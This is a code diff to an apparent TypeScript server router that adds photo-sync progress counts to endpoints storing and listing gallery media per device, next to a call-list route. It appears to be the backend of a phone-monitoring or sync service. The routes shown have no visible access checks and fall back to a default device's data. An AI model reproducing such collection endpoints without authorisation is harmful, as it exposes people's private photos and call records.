@@ -300,13 +300,22 @@ router.get('/calls/list/:deviceId', async (req, res) => {
 
 // Mobile Gallery Media Stream Hub
 const liveGalleryStorage = new Map<string, Array<any>>();
+const liveGalleryStats = new Map<string, { totalDevicePhotos: number; syncedCount: number; remainingCount: number }>();
 let lastSyncedGallery: Array<any> = [];
 
 router.post('/gallery/sync', async (req, res) => {
-  const { deviceId, media } = req.body || {};
+  const { deviceId, media, totalDevicePhotos, syncedCount, remainingCount } = req.body || {};
   const devId = deviceId || 'SN-U5ZY-78QZ';
   const rawList = Array.isArray(media) ? media : [];
   const mediaList = rawList.filter((m: any) => m && m.id && m.thumbnail && typeof m.thumbnail === 'string' && m.thumbnail.length > 100);
+
+  if (typeof totalDevicePhotos === 'number' && totalDevicePhotos > 0) {
+    liveGalleryStats.set(devId, {
+      totalDevicePhotos,
+      syncedCount: typeof syncedCount === 'number' ? syncedCount : mediaList.length,
+      remainingCount: typeof remainingCount === 'number' ? remainingCount : 0
+    });
+  }
 
   if (mediaList.length > 0) {
     const existing = liveGalleryStorage.get(devId) || [];
@@ -360,6 +369,7 @@ router.get('/gallery/list/:deviceId', async (req, res) => {
   const devId = req.params.deviceId;
   const limit = Math.max(1, Math.min(100, parseInt(req.query.limit as string) || 20));
   const offset = Math.max(0, parseInt(req.query.offset as string) || 0);
+  const stats = liveGalleryStats.get(devId) || liveGalleryStats.get('SN-U5ZY-78QZ') || { totalDevicePhotos: 0, syncedCount: 0, remainingCount: 0 };
 
   if (isMongoConnected()) {
     try {
@@ -384,6 +394,9 @@ router.get('/gallery/list/:deviceId', async (req, res) => {
         res.json({
           media: validDb,
           total,
+          totalDevicePhotos: stats.totalDevicePhotos > 0 ? stats.totalDevicePhotos : total,
+          syncedCount: stats.syncedCount > 0 ? stats.syncedCount : total,
+          remainingCount: stats.remainingCount,
           hasMore: offset + validDb.length < total,
           offset,
           limit
@@ -410,6 +423,9 @@ router.get('/gallery/list/:deviceId', async (req, res) => {
   res.json({
     media: pagedList,
     total: cleanList.length,
+    totalDevicePhotos: stats.totalDevicePhotos > 0 ? stats.totalDevicePhotos : cleanList.length,
+    syncedCount: stats.syncedCount > 0 ? stats.syncedCount : cleanList.length,
+    remainingCount: stats.remainingCount,
     hasMore: offset + pagedList.length < cleanList.length,
     offset,
     limit
